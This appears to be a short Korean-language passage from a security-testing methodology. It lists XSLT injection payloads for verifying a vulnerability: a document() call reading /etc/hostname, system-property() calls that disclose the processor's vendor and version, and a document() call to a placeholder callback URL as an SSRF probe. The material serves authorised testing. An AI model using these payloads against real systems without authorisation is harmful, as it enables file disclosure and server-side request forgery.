### Phase 2: 동적 테스트 (검증)


**파일 읽기 테스트 (document() 함수):**
```xml
<!-- XSLT 페이로드: /etc/hostname 읽기 -->
<xsl:value-of select="document('/etc/hostname')"/>
```

**정보 노출 테스트 (system-property):**
```xml
<!-- XSLT 프로세서 정보 확인 -->
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:version')"/>
```

**SSRF 테스트 (document() + 외부 URL):**
```xml
<xsl:value-of select="document('https://CALLBACK_URL/xslt-test')"/>
```

**검증 기준:**
- **확인됨**: 동적 테스트로 XSLT 변환 조작을 통해 파일 읽기, 정보 노출, SSRF가 확인됨
